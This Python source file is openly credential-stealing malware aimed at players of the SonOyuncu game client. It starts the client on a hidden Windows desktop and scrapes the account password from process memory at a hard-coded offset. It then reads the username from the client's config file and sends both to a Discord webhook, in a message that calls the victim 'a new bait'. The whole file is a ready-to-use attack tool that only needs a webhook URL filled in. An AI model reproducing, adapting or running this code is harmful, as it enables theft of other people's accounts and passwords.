import json

import requests, ctypes, psutil, pymem, time, re, os
from ctypes import wintypes

"""
@author: ItzGonza
@version: 2.0
@date: 2025-04-14
"""

APPLICATION_PATH = os.path.expandvars('%APPDATA%') + '/.sonoyuncu/sonoyuncuclient.exe'
CONFIG_PATH = os.path.expandvars('%APPDATA%') + '/.sonoyuncu/config.json'
WEBHOOK_URL = 'UR_WEBHOOK_URL'

class AccountStealer:

    def __init__(self):
        self.kernel32 = ctypes.WinDLL('kernel32')
        self.user32 = ctypes.WinDLL('user32')
        self.desktop_name = "HiddenDesktop"
        self.hidden_desktop = None
        self.process_info = None

    def launch_application(self):
        class STARTUPINFO(ctypes.Structure):
            _fields_ = [
                ('cb', wintypes.DWORD),
                ('lpReserved', wintypes.LPWSTR),
                ('lpDesktop', wintypes.LPWSTR),
                ('lpTitle', wintypes.LPWSTR),
                ('dwX', wintypes.DWORD),
                ('dwY', wintypes.DWORD),
                ('dwXSize', wintypes.DWORD),
                ('dwYSize', wintypes.DWORD),
                ('dwXCountChars', wintypes.DWORD),
                ('dwYCountChars', wintypes.DWORD),
                ('dwFillAttribute', wintypes.DWORD),
                ('dwFlags', wintypes.DWORD),
                ('wShowWindow', wintypes.WORD),
                ('cbReserved2', wintypes.WORD),
                ('lpReserved2', ctypes.POINTER(wintypes.BYTE)),
                ('hStdInput', wintypes.HANDLE),
                ('hStdOutput', wintypes.HANDLE),
                ('hStdError', wintypes.HANDLE)
            ]

        class PROCESS_INFORMATION(ctypes.Structure):
            _fields_ = [
                ('hProcess', wintypes.HANDLE),
                ('hThread', wintypes.HANDLE),
                ('dwProcessId', wintypes.DWORD),
                ('dwThreadId', wintypes.DWORD)
            ]

        startup_info = STARTUPINFO()
        startup_info.cb = ctypes.sizeof(STARTUPINFO)
        startup_info.lpDesktop = self.desktop_name
        startup_info.dwFlags = 0x00000001
        startup_info.wShowWindow = 0

        process_info = PROCESS_INFORMATION()
        success = self.kernel32.CreateProcessW(None, APPLICATION_PATH, None, None, False, 0x08000000, None, None, ctypes.byref(startup_info), ctypes.byref(process_info))

        if not success:
            self.user32.CloseDesktop(self.hidden_desktop)
            raise ctypes.WinError()

        return process_info

    def create_hidden_desktop(self):
        hidden_desktop = self.user32.CreateDesktopW(self.desktop_name, None, None, 0, (0x00000020 | 0x00000040 | 0x00000100 | 0x10000000), None)

        if not hidden_desktop:
            raise ctypes.WinError()

        return hidden_desktop

    def extract_credentials(self):
        try:
            self.hidden_desktop = self.create_hidden_desktop()
            self.process_info = self.launch_application()

            return self.extract_memory_credentials(self.process_info.dwProcessId)
        finally:
            if self.process_info:
                self.cleanup(self.process_info.dwProcessId)

    def extract_memory_credentials(self, process_id):
        start_time = time.time()

        while True:
            if time.time() - start_time > 10:
                break

            try:
                process_memory = pymem.Pymem(process_id)
                base_address = pymem.process.module_from_name(process_memory.process_handle, "sonoyuncuclient.exe").lpBaseOfDll

                password = re.search(r'[A-Za-z0-9._\-@+#$%^&*=!?~\'\",\\|/:<>[\]{}()]{1,128}', process_memory.read_bytes(base_address + 0x1C6900, 100).decode('utf-8', errors='ignore')).group(0)

                return json.load(open(CONFIG_PATH))["userName"], password
            except:
                time.sleep(0.1)
                continue

    def cleanup(self, process_id):
        psutil.Process(process_id).terminate()

        if self.process_info:
            self.kernel32.CloseHandle(self.process_info.hProcess)
            self.kernel32.CloseHandle(self.process_info.hThread)

        if self.hidden_desktop:
            self.user32.CloseDesktop(self.hidden_desktop)


def send_webhook(acc):
    if not acc:
        return

    payload = {
        "username": "hrsz",
        "embeds": [
            {
                "title": "SonOyuncu Account Stealer :dash:",
                "color": 65505,
                "description": (
                    f"a new bait has been spotted :woozy_face:\n\n"
                    f":small_blue_diamond:Username **{acc[0]}**\n"
                    f":small_blue_diamond:Password **{acc[1]}**"
                ),
                "thumbnail": {
                    "url": f"https://www.minotar.net/avatar/{acc[0]}"
                },
                "footer": {
                    "text": "github.com/itzgonza",
                    "icon_url": "https://avatars.githubusercontent.com/u/61884903"
                }
            }
        ]
    }
    return requests.post(WEBHOOK_URL, json=payload).status_code == 204


if __name__ == "__main__":
    if os.path.exists(APPLICATION_PATH):
        account = AccountStealer()
        if send_webhook(account.extract_credentials()):
            print('succesfully ~> {}:{}'.format(*account.extract_credentials()))
